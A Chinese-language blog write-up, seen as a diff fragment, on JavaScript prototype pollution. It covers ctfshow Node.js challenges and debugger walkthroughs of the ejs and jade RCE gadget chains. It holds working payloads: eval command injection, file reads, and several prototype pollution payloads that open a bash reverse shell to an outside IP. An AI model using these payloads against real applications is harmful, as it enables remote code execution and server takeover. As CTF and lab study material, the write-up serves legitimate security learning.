+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>放入poc</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> payload = &#123;<span class="attr">a</span>: <span class="number">1</span>, <span class="string">&quot;__proto__&quot;</span>: &#123;<span class="attr">b</span>: <span class="number">2</span>&#125;&#125;</span><br><span class="line"><span class="title function_">merge</span>(o1, payload)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o1.<span class="property">a</span>, o1.<span class="property">b</span>)</span><br><span class="line"></span><br><span class="line">o2 = &#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o2.<span class="property">b</span>)</span><br></pre></td></tr></table></figure>
+
+<p>发现合并属性是成功了，但是污染失败了，进行调试发现<code>__proto__</code>在代码中并没有被识别成<code>key</code></p>
+<p><img src="/../images/achieve/2025/1/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/QQ20250131-213320.jpg" alt="1"></p>
+<p>究其根本是因为此时的<code>__proto__</code>并不是<code>o1</code>的原型，而只是一个很普通的属性，我们要使其能够正确解析为原型的话需要使用<code>JSON.parse</code></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> payload = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>即可成功，Debug看看，首先<code>a</code>肯定是没有的，所以是直接覆盖</p>
+<p><img src="/../images/achieve/2025/1/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/QQ20250131-213443.jpg" alt="1"></p>
+<p>但是<code>__proto__</code>是在原型里面的所以进行第一条件语句</p>
+<p><img src="/../images/achieve/2025/1/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/QQ20250131-213540.jpg" alt="1"></p>
+<p><code>b</code>和<code>a</code>一样都是<code>undefined</code>所以直接覆盖</p>
+<p><img src="/../images/achieve/2025/1/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/QQ20250131-213703.jpg" alt="1"></p>
+<p>最后完成了污染，了解了这个机制之后做点简单的题目练手</p>
+<h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><h3 id="ctfshow-nodejs专题"><a href="#ctfshow-nodejs专题" class="headerlink" title="ctfshow_nodejs专题"></a>ctfshow_nodejs专题</h3><p>简单题直接放poc，难点的看看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow\123456</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?eval=require(&#x27;child_process&#x27;).execSync(&#x27;ls /&#x27;).toString()</span><br><span class="line">?eval=require( &#x27;child_process&#x27; ).spawnSync( &#x27;ls&#x27;, [ &#x27;/&#x27; ] ).stdout.toString()</span><br><span class="line">?eval=require( &#x27;child_process&#x27; ).spawnSync( &#x27;cat&#x27;, [ &#x27;/app/fl00g.txt&#x27; ] ).stdout.toString()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>); <span class="comment">// 引入 crypto 模块</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">md5</span>(<span class="params">s</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> crypto.<span class="title function_">createHash</span>(<span class="string">&#x27;md5&#x27;</span>)</span><br><span class="line">        .<span class="title function_">update</span>(s)</span><br><span class="line">        .<span class="title function_">digest</span>(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> a = &#123;<span class="string">&#x27;x&#x27;</span>:<span class="string">&#x27;1&#x27;</span>&#125;;</span><br><span class="line"><span class="keyword">let</span> b = &#123;<span class="string">&#x27;x&#x27;</span>:<span class="string">&#x27;2&#x27;</span>&#125;;</span><br><span class="line"><span class="keyword">let</span> flag = <span class="string">&quot;your_secret_flag&quot;</span>; <span class="comment">// 定义 flag 变量</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>((a+flag));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">md5</span>(a + flag)); <span class="comment">// 计算 a 和 flag 拼接后的 MD5</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">md5</span>(b + flag)); <span class="comment">// 计算 b 和 flag 拼接后的 MD5</span></span><br><span class="line"><span class="comment">// [object Object]your_secret_flag</span></span><br><span class="line"><span class="comment">// 2f97f1090b894fe22dd12594701b928a</span></span><br><span class="line"><span class="comment">// 2f97f1090b894fe22dd12594701b928a</span></span><br></pre></td></tr></table></figure>
+
+<p>web338跟进copy函数看到了和merge差不多的东西</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;ctfshow&quot;:&quot;36dboy&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>web339</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sum = <span class="keyword">new</span> <span class="title class_">Function</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;return a + b&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">sum</span>(<span class="number">2</span>, <span class="number">6</span>));</span><br><span class="line"></span><br><span class="line">query=<span class="string">&quot;return 123&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Function</span>(query)(query));</span><br></pre></td></tr></table></figure>
+
+<p>所以污染即可RCE <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function">Function</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/156.238.233.9/9999 0&gt;&amp;1\&quot;&#x27;)&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后POST访问<code>/api</code>，使得函数执行</p>
+<p>web340把对象套了一层</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/156.238.233.9/9999 0&gt;&amp;1\&quot;&#x27;)&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>web341即使是有污染的地方，但是没有地方可以执行了，这个时候就要看框架本身是否有漏洞，可以看到引用了<code>ejs</code>，上网搜索一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/156.238.233.9/9999 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>web342&amp;&amp;web343是<code>jade</code>，还是框架，参数是<code>login.js</code>里面可以看到的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;: &#123;&quot;type&quot;:&quot;Block&quot;,&quot;nodes&quot;:&quot;&quot;,&quot;compileDebug&quot;:1,&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/156.238.233.9/9999 0&gt;&amp;1\&quot;&#x27;)&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>web344极客大挑战里面的东西</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?query=&#123;&quot;name&quot;:&quot;admin&quot;&amp;query=&quot;password&quot;:&quot;%63tfshow&quot;&amp;query=&quot;isVIP&quot;:true&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="ejs经典审计"><a href="#ejs经典审计" class="headerlink" title="ejs经典审计"></a>ejs经典审计</h3><p>经过一会的折磨终于是给复现出来了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8888/?malicious_payload=&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;);var __tmp2&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>代码如下</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> lodash= <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> ejs = <span class="built_in">require</span>(<span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = <span class="title function_">express</span>();</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, __dirname);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> malicious_payload = req.<span class="property">query</span>.<span class="property">malicious_payload</span>;</span><br><span class="line"></span><br><span class="line">    lodash.<span class="title function_">merge</span>(&#123;&#125;, <span class="title class_">JSON</span>.<span class="title function_">parse</span>(malicious_payload));</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&quot;./test.ejs&quot;</span>, &#123;</span><br><span class="line">        <span class="attr">message</span>: <span class="string">&#x27;baozongwi test &#x27;</span>,</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置http</span></span><br><span class="line"><span class="keyword">var</span> server = app.<span class="title function_">listen</span>(<span class="number">8888</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> port = server.<span class="title function_">address</span>().<span class="property">port</span></span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;应用实例，访问地址为 http://127.0.0.1:%s&quot;</span>, port)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.ejs</span></span><br><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>&lt;%= message %&gt;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>这两个文件是在同一目录下面的并且要求版本要对，其他依赖自己安装即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm init -y</span><br><span class="line">npm install ejs@3.1.5 lodash@4.17.4 express</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/achieve/2025/1/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/QQ20250205-141434.jpg" alt="1"></p>
+<p>首先我们看到在本来就有的<code>lodash</code>之中就有可利用的<code>merge</code>方法，查看官方文档<a target="_blank" rel="noopener" href="https://www.lodashjs.com/docs/lodash.merge">lodash.merge</a>，</p>
+<p><img src="/../images/achieve/2025/1/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/QQ20250205-155440.jpg" alt="1"></p>
+<p>跟进之后发现和我们常知道的merge方法基本一致，只不过其中值的替换是使用的原生方法</p>
+<p><img src="/../images/achieve/2025/1/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/QQ20250205-155511.jpg" alt="1"></p>
+<p>这里进行动态Debug之后发现并不能达到目的，跟不进<code>res.render</code>但是可以知道应该是模板渲染造成的问题</p>
+<p><img src="/../images/achieve/2025/1/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/QQ20250205-141910.jpg" alt="1"></p>
+<p><img src="/../images/achieve/2025/1/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/QQ20250205-142004.jpg" alt="1"></p>
+<p>TM的卡了好几个小时，也不知道怎么解决这个问题，最后就是草草的使用一种很垃圾的方法，比如我已知<code>res.render</code>是<code>response.render</code>然后就在本身的<code>response.js</code>里面的<code>res.render</code>方法打断点，但是反观VSCODE一点毛病都没有，可以直接打断点，很好的跳转过去，所以如何解决，换工具噻，识时务者为俊杰，话不多说开始Debug，这里我们直接跟进到<code>res.render</code></p>
+<p><img src="/../images/achieve/2025/1/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/QQ20250217-193214.jpg" alt="1"></p>
+<p>发现一堆赋值继续跟进<code>app.render</code>，算了，由于是后手挖洞，在调试到后面的时候突然弹出计算器，再Debug一遍我就找到漏洞位置了，我就简单的把跟进顺序写到这里把</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">tryRender(view, renderOptions, done);</span><br><span class="line">view.render(options, callback);</span><br><span class="line">this.engine(this.path, options, callback);</span><br><span class="line">tryHandleCache(opts, data, cb);</span><br><span class="line">result = handleCache(options)(data);</span><br><span class="line">func = exports.compile(template, options);</span><br><span class="line">templ.compile();</span><br></pre></td></tr></table></figure>
+
+<p>然后就到了这个洞的关键代码</p>
+<p><img src="/../images/achieve/2025/1/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/QQ20250217-194958.jpg" alt="1"></p>
+<p>仔细看到</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (opts.<span class="property">outputFunctionName</span>) &#123;</span><br><span class="line">        prepended += <span class="string">&#x27;  var &#x27;</span> + opts.<span class="property">outputFunctionName</span> + <span class="string">&#x27; = __append;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果有这个就会做一个赋值，并且是直接进行拼接的，我们可以直接覆盖一下RCEpayload，并且知道ejs渲染的问题，他会直接return，</p>
+<p><img src="/../images/achieve/2025/1/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/QQ20250217-195837.jpg" alt="1"></p>
+<p>所以成功RCE</p>
+<h3 id="jade经典审计"><a href="#jade经典审计" class="headerlink" title="jade经典审计"></a>jade经典审计</h3><p>直接拿ctfshowWeb342来打测试</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/login</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:3000</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Not A(Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;132&quot;, &quot;Google Chrome&quot;;v=&quot;132&quot;</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://localhost:3000/login</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>Pycharm-b67cff77=fce87d75-f174-495d-995f-cd4b7f95bc23; Phpstorm-64fad50=45b19771-5703-4811-9cb0-4f702c4b7551; cookieconsent_status=dismiss; Webstorm-fc2011f5=4606b2a7-d9d2-43ac-8f66-4a320f0b0227; SL_GWPT_Show_Hide_tmp=undefined; SL_wptGlobTipTmp=undefined; SL_G_WPT_TO=zh</span><br><span class="line"><span class="attribute">sec-purpose</span><span class="punctuation">: </span>prefetch;prerender</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://localhost:3000</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">purpose</span><span class="punctuation">: </span>prefetch</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>none</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br, zstd</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>174</span><br><span class="line"></span><br><span class="line"><span class="language-scilab">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;__proto__&quot;</span>: &#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;Block&quot;</span>,<span class="string">&quot;nodes&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;compileDebug&quot;</span>:<span class="number">1</span>,<span class="string">&quot;self&quot;</span>:<span class="number">1</span>,<span class="string">&quot;line&quot;</span>:<span class="string">&quot;global.process.mainModule.require(&#x27;</span>child_process&#x27;).<span class="built_in">exec</span>(<span class="string">&#x27;calc&#x27;</span>)<span class="string">&quot;&#125;&#125;,&quot;</span>uo2a3i0d43<span class="string">&quot;:&quot;</span>=<span class="string">&quot;&#125;</span></span></span><br><span class="line"><span class="string"><span class="language-scilab"></span></span></span><br></pre></td></tr></table></figure>
+
+<p>最开始以为是这里，调试了半天发现不对劲</p>
+<p><img src="/../images/achieve/2025/1/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/QQ20250217-205355.jpg" alt="1"></p>
+<p>搞了好久，发现都没有进行渲染所以这里肯定不对，然后搜到到<code>render</code>，发现在<code>index.js</code></p>
+<p><img src="/../images/achieve/2025/1/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/QQ20250217-205456.jpg" alt="1"></p>
+<p>还是直接写调用栈，只不过这里需要发一次poc之后访问网站根目录，才能正确进入渲染</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">res.render(&#x27;index&#x27;,&#123;title:&#x27;ctfshow&#x27;&#125;);</span><br><span class="line">app.render(view, opts, done);</span><br><span class="line">tryRender(view, renderOptions, done);</span><br><span class="line">view.render(options, callback);</span><br><span class="line">this.engine(this.path, options, callback);</span><br><span class="line">exports.renderFile(path, options, fn);</span><br><span class="line">res = exports.renderFile(path, options);</span><br><span class="line">var templ = exports.compile(str, options);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/achieve/2025/1/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/QQ20250217-210535.jpg" alt="1"></p>
+<p>就到关键代码了，但是好像就看到了一个覆盖<code>compileDebug</code>，没看到为啥RCE，挨着跟进看看，最后发现是跟进下图的位置</p>
+<p><img src="/../images/achieve/2025/1/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/QQ20250217-212014.jpg" alt="1"></p>
+<p><img src="/../images/achieve/2025/1/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/QQ20250217-212252.jpg" alt="1"></p>
+<p>跟进一下<code>js = compiler.compile();</code></p>
+<p><img src="/../images/achieve/2025/1/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/QQ20250217-213530.jpg" alt="1"></p>
+<p>继续到<code>visit</code></p>
+<p><img src="/../images/achieve/2025/1/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/QQ20250217-213633.jpg" alt="1"></p>
+<p>可以看到Debug为真，会把line给拼接进去，继续跟进<code>visitNode</code></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">visitNode</span>: <span class="keyword">function</span>(<span class="params">node</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>[<span class="string">&#x27;visit&#x27;</span> + node.<span class="property">type</span>](node);</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>
+
+<p>也就是要我们自己添加type来供其使用，这里测试出来的结果</p>
+<table>
+<thead>
+<tr>
+<th>Method Name</th>
+<th>Status</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>visitAttributes</td>
+<td></td>
+</tr>
+<tr>
+<td>visitBlock</td>
+<td></td>
+</tr>
+<tr>
+<td>visitBlockComment</td>
+<td>√</td>
+</tr>
+<tr>
+<td>visitCase</td>
+<td></td>
+</tr>
+<tr>
+<td>visitCode</td>
+<td>√</td>
+</tr>
+<tr>
+<td>visitComment</td>
+<td>√</td>
+</tr>
+<tr>
+<td>visitDoctype</td>
+<td></td>
+</tr>
+<tr>
+<td>visitEach</td>
+<td></td>
+</tr>
+<tr>
+<td>visitFilter</td>
+<td></td>
+</tr>
+<tr>
+<td>visitMixin</td>
+<td></td>
+</tr>
+<tr>
+<td>visitMixinBlock</td>
+<td>√</td>
+</tr>
+<tr>
+<td>visitNode</td>
+<td></td>
+</tr>
+<tr>
+<td>visitLiteral</td>
+<td></td>
+</tr>
+<tr>
+<td>visitText</td>
+<td></td>
+</tr>
+<tr>
+<td>visitTag</td>
+<td></td>
+</tr>
+<tr>
+<td>visitWhen</td>
+<td></td>
+</tr>
+</tbody></table>
+<p>到这里就是一条完整的链子了，首先要覆盖<code>Debug</code>，其中<code>line</code>是我们的恶意代码，<code>type</code>写Code，回头写出来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;: &#123;&quot;type&quot;:&quot;Code&quot;,&quot;compileDebug&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;)&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现东西少了，一看还有变量是未定义的要赋值</p>
+<p><img src="/../images/achieve/2025/1/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/QQ20250217-215622.jpg" alt="1"></p>
+<p>给<code>self</code>赋值为<code>true</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;compileDebug&quot;:1,&quot;type&quot;:&quot;Code&quot;,&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;)&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>就这样还少写了不少条件，<code>return handleTemplateCache(options)(options);</code>进行命令执行，成功RCE，发两次包即可成功渲染</p>
+<h1 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h1><p>特别鸣谢KW师傅和挺同志，教我打断点起项目</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
